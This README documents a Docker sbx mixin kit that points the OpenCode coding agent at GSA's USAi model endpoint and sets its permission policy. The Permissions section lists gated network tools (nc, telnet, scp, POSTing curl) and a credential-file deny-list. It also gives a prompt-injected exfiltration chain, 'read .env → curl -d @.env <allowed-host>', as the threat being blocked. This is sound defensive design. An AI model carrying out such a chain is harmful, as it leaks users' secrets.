# usai-provider (sbx mixin kit)

An [sbx](https://docs.docker.com/ai/sandboxes/) **mixin kit** that configures a
coding agent to use the GSA **USAi** OpenAI-compatible endpoint as its model
provider, with network egress allow-listed.

## Scope and roadmap

Today this kit targets **OpenCode**: it ships an `opencode.jsonc` and merges it
into OpenCode's global config. It is named `usai-provider` (rather than
`usai-opencode-provider`) deliberately — the intent is to grow it into a single
kit that configures the USAi provider for **multiple agents** (e.g. Codex,
Claude Code, Cursor) as their config formats are added. Until then, applying it
on a non-OpenCode agent has no effect beyond the network allow-list.

## What it does

- **Network egress** — allow-lists `api.gsa.usai.gov` (`caps.network`), since
  USAi is a custom endpoint, not a built-in sbx service.
- **Provider config** — ships `opencode.jsonc` (the USAi provider block + the
  generated USAi model catalog) and, at startup, **merges it into OpenCode's
  global config** (`~/.config/opencode/opencode.jsonc`) so OpenCode loads it
  instead of prompting for a provider — without clobbering any existing global
  config (see [Design: merge, don't clobber](#design-merge-dont-clobber)).
- **Permissions** — a deliberately **default-allow** OpenCode permission policy
  tuned for the sandbox, keeping only a zero-prompt `read` credential deny-list
  (see [Permissions](#permissions)).

## Permissions

The shipped `opencode.jsonc` uses a **default-allow** permission policy. This is
a deliberate deviation from a host-safe config, and it is safe **only because
this kit runs exclusively inside an sbx sandbox**: an ephemeral container with no
host filesystem access, a proxied/allow-listed network, and injected credentials
(the container never holds real key material). That isolation is the security
boundary; re-gating ordinary operations (`rm`, package installs, `sudo`,
`env`/`printenv`, …) would only duplicate it and train users to approve prompts
reflexively.

The policy gates (`ask`):

- **New-outbound-destination commands** — `git push`, `git remote add`/`set-url`,
  `gh pr create`/`gh api`, and `scp`/`sftp`/`rsync`/`nc`/`telnet`. This is a
  human-in-the-loop *affordance* for the highest-consequence "push my workspace
  somewhere named" actions, **not** an exhaustive egress firewall — the sandbox
  proxy allow-list is the real network control, so `aws s3 cp`/`gcloud`/`az`/
  `docker push`/`dig` are intentionally left ungated (same proxy boundary; see
  the decision record).
- **Data-bearing `curl`/`wget`** (`-d`/`--data`/`-F`/`-T`/`-X POST`, wget
  `--post-*`/`--body-*`) — as **defense-in-depth**, not a completeness claim.

It also keeps one hard **`deny`**: the `read` tool's **credential-file
deny-list** (`.env`, `*.pem`, `*.key`, `*.tfvars`, `~/.aws/*`, kubeconfig, …).
This costs zero prompts (reading credentials is never the agent's job) and is the
one control the proxy allow-list can't provide — it breaks a prompt-injected
`read .env` → `curl -d @.env <allowed-host>` chain at the read step. It governs
the **read tool** only (not `bash`, so `cat .env` isn't blocked), so it is
belt-and-suspenders, not a complete exfil block.

Everything else — including benign `curl`/`wget` reads and secret-surfacing
commands like `env`/`printenv`/`git remote -v` (which expose injected
placeholders, not real secrets) — is allowed. `bash` has **no** hard-deny rules;
the sandbox, not a bash denylist, is the control there.

**Want a stricter posture?** Don't fork this kit. Compose a separate mixin that
contributes `ask`/`deny` rules via a project-layer
`<workspace>/.opencode/opencode.jsonc`, which OpenCode deep-merges *over* this
config (OpenCode evaluates the **last matching** rule, so a later fragment wins —
which is also why this config orders every `ask` edge after the broad `allow`).
See
[`docs/decisions/0003-relax-permissions-for-sandbox.md`](docs/decisions/0003-relax-permissions-for-sandbox.md).

## Usage

```bash
sbx run --kit <path-to-this-kit> opencode /path/to/project
```

The kit is a `mixin`, so it composes with other kits via additional `--kit`
flags.

## Prerequisites

The USAi API key is **not** stored in the kit. The shipped `opencode.jsonc`
reads it from the injected `USAI_API_KEY` env var. Store it once in sbx's secret
store (the proxy injects it; the container never sees the raw value):

```bash
sbx secret set-custom -g --host api.gsa.usai.gov --env USAI_API_KEY
```

USAi keys expire periodically — if the agent starts failing auth, rotate the key
and update the secret. See [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md).

## Design: merge, don't clobber

OpenCode reads config from the **global** path
(`~/.config/opencode/opencode.json[c]`) < **project**
(`<workspace>/.opencode/`). By request, this kit lands its config at the
**global** path (rather than pointing `OPENCODE_CONFIG` at a namespaced file, as
earlier versions did).

To avoid overwriting a global config the base template or another kit may have
written, a startup step **merges** instead of copying blindly:

- **No existing global config** → the kit's `opencode.jsonc` is copied
  **verbatim** (comments and the ownership marker preserved).
- **An existing global config** → the USAi keys are **deep-merged into** it.
  USAi wins for its own keys (`provider.usai`, `model`, `small_model`, `agent`,
  `permission`, …); unrelated keys are preserved; any existing leaf the kit
  overrides (e.g. a pre-existing top-level `model`) is logged as a warning.
  Comments are dropped in this branch (JSON has none) — the fully annotated
  source stays at `~/usai-config/opencode.jsonc` and in this repo.

The merge is idempotent and runs as the agent user at every start. See
[`docs/decisions/0004-global-config-merge-instead-of-opencode-config.md`](docs/decisions/0004-global-config-merge-instead-of-opencode-config.md).

## Co-tenancy

Because the kit no longer sets `OPENCODE_CONFIG` (a single-valued env var that
only one kit could own), there is no env-var shadowing to guard against. Another
kit that needs to add OpenCode config should drop its fragment at
`<workspace>/.opencode/opencode.jsonc` (kit `files/workspace/...`) — OpenCode's
**project** layer deep-merges it *over* the global config, so its keys and the
USAi provider config compose without either clobbering the other.

> The ownership **marker comment**
> (`usai-provider-kit:owns-opencode-config`) is retained in the shipped file. It
> is a JSONC **comment**, not a config key, because OpenCode validates against a
> closed schema and rejects unknown top-level keys. It survives the verbatim-copy
> path and lets `scripts/verify` recognize the kit's own config.

## Updating the model catalog

The shipped `opencode.jsonc` contains a generated block of USAi models. To
refresh it against the live USAi + models.dev data:

```bash
npm run sync:usai-models     # from this kit directory
```

The generator only rewrites the region between the `BEGIN/END GENERATED USAI
MODELS` markers and the default model selection; the ownership marker comment and
hand-maintained config are preserved. `npm test` covers the generator.

### Token limits and pricing

Each generated model carries a `limit` (context/output tokens) and, when known,
a `cost` object (USD **per 1M tokens**: `input`, `output`, and where available
`cache_read`, `cache_write`, plus a `context_over_200k` override for
context-tiered pricing). Both are sourced from
[models.dev](https://models.dev)'s `api.json` catalog. Only the cost keys
OpenCode's config schema accepts are emitted — models.dev extras such as
`input_audio`, `output_audio`, `reasoning`, and the `tiers` array are dropped so
the config validates cleanly.

Pricing is **backend-aware**: USAi routes each vendor through a specific
backend, so the generator pulls each vendor's price from the matching
models.dev provider rather than the first-party catalog:

| USAi vendor | models.dev provider | fallback |
| --- | --- | --- |
| Anthropic (Claude) | `amazon-bedrock` | `anthropic` |
| OpenAI (GPT) | `azure` | `openai` |
| Google (Gemini) | `google-vertex` | `google` |
| Meta (Llama) | `amazon-bedrock` | `meta`, `llama` |
| Cohere | `cohere` | — |

Bedrock Claude pricing uses the US/base regional entries (the `eu.`/`au.`
prefixes carry a premium and are deliberately demoted). Models with no
models.dev match keep their fallback limits and omit `cost`.

## Verifying

Run the bundled check on a host with `sbx` installed and logged in:

```bash
./scripts/verify
```

It validates the spec, creates a throwaway sandbox with the kit, and confirms
the global config (`~/.config/opencode/opencode.jsonc`) exists and carries the
USAi `provider.usai` block, that a pre-seeded foreign global key survives the
merge, and that the USAi API is reachable with the injected key. Set `KEEP=1` to
keep the sandbox for inspection.

## Design decisions

See [`docs/decisions/`](docs/decisions/):

- [`0001-usai-provider-as-mixin-kit.md`](docs/decisions/0001-usai-provider-as-mixin-kit.md)
  — why a self-contained kit, secret handling (config-delivery portion
  superseded by 0004).
- [`0002-opencode-config-co-tenancy.md`](docs/decisions/0002-opencode-config-co-tenancy.md)
  — the old single-`OPENCODE_CONFIG` owner contract (**superseded** by 0004).
- [`0003-relax-permissions-for-sandbox.md`](docs/decisions/0003-relax-permissions-for-sandbox.md)
  — why the permission policy is default-allow, and how to re-gate via a mixin.
- [`0004-global-config-merge-instead-of-opencode-config.md`](docs/decisions/0004-global-config-merge-instead-of-opencode-config.md)
  — why the kit merges into the global config path instead of setting
  `OPENCODE_CONFIG`.

## Layout

```
usai-provider-kit/
├── spec.yaml                                   # the kit
├── files/home/usai-config/
│   ├── opencode.jsonc                          # USAi provider + model catalog
│   └── merge-global-config.mjs                 # startup merge into global config
├── scripts/
│   ├── sync-usai-models.mjs                    # regenerate the model catalog
│   └── verify                                  # host-side end-to-end check
├── tests/                                      # generator + merge tests + fixture
├── docs/decisions/                             # numbered design decision records
└── package.json                                # npm test / sync:usai-models
```
